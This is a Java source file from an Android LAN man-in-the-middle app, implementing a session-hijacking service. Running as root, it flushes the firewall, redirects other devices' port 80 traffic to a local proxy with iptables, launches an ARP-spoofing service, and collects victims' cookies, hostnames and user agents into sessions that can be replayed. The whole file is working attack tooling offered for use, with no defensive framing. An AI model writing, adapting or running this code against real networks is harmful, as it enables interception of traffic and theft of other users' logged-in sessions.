package com.oinux.lanmitm.service;

import java.util.ArrayList;

import org.apache.http.impl.cookie.BasicClientCookie;

import com.oinux.lanmitm.AppContext;
import com.oinux.lanmitm.entity.Session;
import com.oinux.lanmitm.proxy.HttpProxy;
import com.oinux.lanmitm.proxy.HttpProxy.OnRequestListener;
import com.oinux.lanmitm.ui.HijackActivity;
import com.oinux.lanmitm.ui.HttpActivity;
import com.oinux.lanmitm.util.RequestParser;
import com.oinux.lanmitm.util.ShellUtils;

import android.content.Intent;
import android.util.Log;

public class HijackService extends BaseService {

	private static final String[] PORT_REDIRECT_CMD = {
			"iptables -t nat -F",
			"iptables -F",
			"iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE",
			"iptables -P FORWARD ACCEPT",
			"iptables -t nat -A PREROUTING -j DNAT -p tcp --dport 80 --to "
					+ AppContext.getIp() + ":" + HttpProxy.HTTP_PROXY_PORT };

	private static final String[] UN_PORT_REDIRECT_CMD = {
			"iptables -t nat -F",
			"iptables -F",
			"iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE",
			"iptables -t nat -D PREROUTING -j DNAT -p tcp --dport 80 --to "
					+ AppContext.getIp() + ":" + HttpProxy.HTTP_PROXY_PORT };

	private HttpProxy mHttpProxy;
	private OnRequestListener mOnRequestListener = null;

	public static final String DATASET_CHANGED = "HIJACK_DATASET_CHANGED";
	public static final String DATASET_COOKIES_CHANGED = "HIJACK_COOKIES_CHANGED";

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		if (!ShellUtils.checkRootPermission())
			return super.onStartCommand(intent, flags, startId);

		startHijack();

		return super.onStartCommand(intent, flags, startId);
	}

	private void startHijack() {
		HttpProxy.stop = false;

		new Thread() {
			@Override
			public void run() {
				ShellUtils.execCommand(PORT_REDIRECT_CMD, true, true);
			}
		}.start();

		mOnRequestListener = new OnRequestListener() {

			@Override
			public void onRequest(String clientIp, String hostname,
					String serverIp, String path, ArrayList<String> headers) {
				Log.v("host", hostname);
				ArrayList<BasicClientCookie> cookies = RequestParser
						.getCookiesFromHeaders(headers);
				if (cookies.size() > 0) {
					String domain = cookies.get(0).getDomain();
					if (domain == null || domain.isEmpty()) {
						domain = RequestParser.getBaseDomain(hostname);
						for (BasicClientCookie cooky : cookies)
							cooky.setDomain(domain);
					}
				}
				Session session = null;
				Intent intent = new Intent();
				for (int i = 0; i < AppContext.getHijackList().size(); i++) {
					if (AppContext.getHijackList().get(i).getIp()
							.equals(serverIp)) {
						session = AppContext.getHijackList().get(i);
						intent.setAction(DATASET_COOKIES_CHANGED);
						break;
					}
				}
				if (session == null) {
					session = new Session();
					session.setIp(serverIp);
					session.setClientIp(clientIp);
					session.setDomain(hostname);
					session.setUserAgent(RequestParser.getHeaderValue(
							"User-Agent", headers));
					AppContext.getHijackList().add(session);
					intent.setAction(DATASET_CHANGED);
				}
				for (BasicClientCookie cookie : cookies) {
					session.getCookies().put(cookie.getName(), cookie);
				}
				session.setPath(path);
				sendBroadcast(intent);
			}
		};

		mHttpProxy = HttpProxy.getInstance();
		mHttpProxy.setOnRequestListener(mOnRequestListener);
		mHttpProxy.start();

		Intent intent = new Intent(this, ArpService.class);
		intent.putExtra("arp_cheat_way", ArpService.ONE_WAY_HOST);
		startService(intent);

		notice("会话劫持后台运行中，点击管理", HIJACK_NOTICE, HijackActivity.class);

		AppContext.isHijackRunning = true;
	}

	private void stopHijack() {
		if (!AppContext.isTcpdumpRunning)
			stopService(new Intent(this, ArpService.class));

		new Thread() {
			@Override
			public void run() {
				ShellUtils.execCommand(UN_PORT_REDIRECT_CMD, true, true);
			}
		}.start();

		if (!AppContext.isInjectRunning) {
			HttpProxy.stop = true;
			if (mHttpProxy != null) {
				mHttpProxy.interrupt();
				mHttpProxy = null;
			}
		}

		AppContext.isHijackRunning = false;
	}

	@Override
	public void onDestroy() {
		stopHijack();
		super.onDestroy();
	}
}
